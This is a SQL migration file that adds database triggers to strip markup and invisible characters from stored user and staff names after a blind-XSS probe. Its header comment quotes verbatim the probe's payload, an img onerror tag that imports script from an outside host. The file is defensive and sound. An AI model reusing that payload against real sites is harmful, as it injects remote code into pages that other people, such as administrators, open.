-- Database-level backstop for markup in stored names.
--
-- Context: on 2026-08-15 a blind-XSS probe (jake@0x01.pk) signed up with
-- `<img src onerror=import("//0x01.pk/blind-x/")>` in full_name, first_name,
-- business_name and a pos_staff.name. Nothing executed — React escapes JSX
-- text, so the admin panel showed the payload as literal characters — but the
-- values were stored, and any future consumer that builds HTML (or a CSV, or a
-- PDF) from them would have inherited the problem.
--
-- API routes now sanitise these fields, but the app also writes profiles
-- DIRECTLY from the browser via supabase-js under RLS (app/onboarding/page.tsx,
-- app/(app)/settings/page.tsx), and auth.users.raw_user_meta_data is set by the
-- client at signUp(). Route-level validation cannot cover either path, so the
-- rule is enforced here, where every write has to pass.
--
-- Deliberately strips rather than raises: a legitimate name never contains
-- angle brackets or control characters, and failing an insert would break
-- signup for anyone who pastes an invisible character out of a keyboard app.

create or replace function public.strip_markup(value text)
returns text
language sql
immutable
-- No table access, so no search_path exposure; SECURITY INVOKER (the default)
-- is correct here — this must never run with elevated rights.
as $$
  select nullif(
    btrim(
      regexp_replace(
        regexp_replace(
          regexp_replace(coalesce(value, ''), '[<>]', '', 'g'),
          -- ASCII/C1 control characters
          '[[:cntrl:]]', '', 'g'
        ),
        -- Zero-width and bidi-override characters: invisible in a review, but
        -- they let a payload hide inside what looks like an ordinary name.
        E'[​-‏  ﻿]', '', 'g'
      )
    ),
    ''
  )
$$;

comment on function public.strip_markup(text) is
  'Removes angle brackets and control/zero-width characters from stored free text. Used by the name-sanitising triggers; see 20260817_sanitize_profile_names.sql.';

-- ── profiles ────────────────────────────────────────────────────────────────
create or replace function public.sanitize_profile_names()
returns trigger
language plpgsql
as $$
begin
  new.full_name     := left(public.strip_markup(new.full_name),     120);
  new.first_name    := left(public.strip_markup(new.first_name),    120);
  new.last_name     := left(public.strip_markup(new.last_name),     120);
  new.business_name := left(public.strip_markup(new.business_name),  120);
  new.town          := left(public.strip_markup(new.town),           120);
  new.county        := left(public.strip_markup(new.county),         120);
  new.address       := left(public.strip_markup(new.address),        300);
  return new;
end;
$$;

drop trigger if exists trg_sanitize_profile_names on public.profiles;
create trigger trg_sanitize_profile_names
  before insert or update on public.profiles
  for each row execute function public.sanitize_profile_names();

-- ── pos_staff ───────────────────────────────────────────────────────────────
-- A staff name is written by an owner or manager and then displayed to other
-- people (owner dashboards, receipts, the audit log), so it is untrusted input
-- to those surfaces even though its author is authenticated.
create or replace function public.sanitize_pos_staff_name()
returns trigger
language plpgsql
as $$
declare
  cleaned text;
begin
  cleaned := left(public.strip_markup(new.name), 120);
  -- pos_staff.name is NOT NULL (018_pos.sql), and strip_markup returns NULL for
  -- a value that was nothing but markup. Raise a readable error rather than
  -- letting it surface as a bare not-null violation.
  if cleaned is null then
    raise exception 'Staff name must contain at least one ordinary character'
      using errcode = '23514';
  end if;
  new.name := cleaned;
  return new;
end;
$$;

drop trigger if exists trg_sanitize_pos_staff_name on public.pos_staff;
create trigger trg_sanitize_pos_staff_name
  before insert or update on public.pos_staff
  for each row execute function public.sanitize_pos_staff_name();

-- ── Clean the payloads already on record ────────────────────────────────────
-- A no-op UPDATE fires the triggers above, which rewrites every existing row
-- through strip_markup. Scoped to rows that actually contain a bracket so this
-- does not churn every profile row and its updated_at.
update public.profiles
   set full_name = full_name
 where full_name     like '%<%' or full_name     like '%>%'
    or first_name    like '%<%' or first_name    like '%>%'
    or last_name     like '%<%' or last_name     like '%>%'
    or business_name like '%<%' or business_name like '%>%';

update public.pos_staff
   set name = name
 where name like '%<%' or name like '%>%';
